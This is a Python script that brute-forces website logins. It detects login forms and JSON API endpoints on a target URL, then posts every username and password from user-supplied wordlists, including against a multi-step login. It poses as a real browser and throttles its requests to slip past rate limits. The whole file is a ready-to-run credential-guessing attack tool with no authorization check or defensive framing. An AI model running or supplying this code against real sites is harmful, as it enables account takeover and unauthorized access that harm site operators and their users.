import requests
from bs4 import BeautifulSoup
import json
import time

# User Input
print("https://github.com/Stalin-143")
url = input("Enter the target URL: ").strip()
username_file = input("Enter the username list file path: ").strip()
password_file = input("Enter the password list file path: ").strip()

# Load usernames and passwords
def load_wordlist(filepath):
    try:
        with open(filepath, "r", encoding="latin-1") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print(f"[!] File not found: {filepath}")
        exit()
    except UnicodeDecodeError:
        print(f"[!] Error decoding file: {filepath}. Try converting it to UTF-8.")
        exit()

usernames = load_wordlist(username_file)
passwords = load_wordlist(password_file)

# Headers to simulate a real browser
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Referer": url
}

# Detect login forms
def get_login_forms(target_url):
    response = requests.get(target_url, headers=headers)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")

    login_forms = []
    for form in forms:
        inputs = form.find_all("input")
        form_data = {}
        for inp in inputs:
            field_type = inp.get("type")
            field_name = inp.get("name")

            if field_type in ["text", "email"]:
                form_data["username_field"] = field_name
            elif field_type == "password":
                form_data["password_field"] = field_name

        if "username_field" in form_data and "password_field" in form_data:
            form_data["action"] = form.get("action")
            login_forms.append(form_data)

    return login_forms

# Detect API-based login endpoints (JS, AJAX)
def detect_api_endpoints(target_url):
    response = requests.get(target_url, headers=headers)
    if "fetch(" in response.text or "axios.post(" in response.text:
        print("[+] Possible JavaScript-based API login detected.")
        return True
    return False

# Brute force HTML-based login
def brute_force_html(login_forms):
    for form in login_forms:
        login_url = url + form["action"] if form["action"] else url
        username_field = form["username_field"]
        password_field = form["password_field"]

        print(f"\n[+] Testing form at {login_url} with fields: {username_field}, {password_field}")

        for username in usernames:
            for password in passwords:
                data = {username_field: username, password_field: password}
                response = requests.post(login_url, data=data, headers=headers)

                if "incorrect" not in response.text.lower() and response.status_code == 200:
                    print(f"[✅] Credentials Found: {username} | {password}")
                    exit()
                else:
                    print(f"[-] Tried: {username} | {password}")

                time.sleep(1)  # Avoid rate-limiting

# Brute force API-based login
def brute_force_api():
    print("\n[+] Attempting brute force on API login...")
    for username in usernames:
        for password in passwords:
            json_data = {"username": username, "password": password}
            response = requests.post(url, json=json_data, headers=headers)

            if response.status_code == 200 and "token" in response.text:
                print(f"[✅] API Credentials Found: {username} | {password}")
                exit()
            else:
                print(f"[-] API Tried: {username} | {password}")

            time.sleep(1)

# Multi-step login (username first, then password)
def brute_force_multi_step():
    print("\n[+] Attempting multi-step login brute force...")
    session = requests.Session()

    for username in usernames:
        # Step 1: Submit username
        response = session.post(url, data={"username": username}, headers=headers)

        if response.status_code == 200:
            print(f"[+] Username {username} exists, proceeding to password check...")

            for password in passwords:
                response = session.post(url, data={"password": password}, headers=headers)

                if response.status_code == 200 and "incorrect" not in response.text.lower():
                    print(f"[✅] Multi-Step Credentials Found: {username} | {password}")
                    exit()
                else:
                    print(f"[-] Multi-Step Tried: {username} | {password}")

                time.sleep(1)

# Main Execution
login_forms = get_login_forms(url)
api_detected = detect_api_endpoints(url)

if login_forms:
    print(f"[+] Found {len(login_forms)} login form(s).")
    brute_force_html(login_forms)

if api_detected:
    brute_force_api()

brute_force_multi_step()

print("\n[+] Brute force finished.")
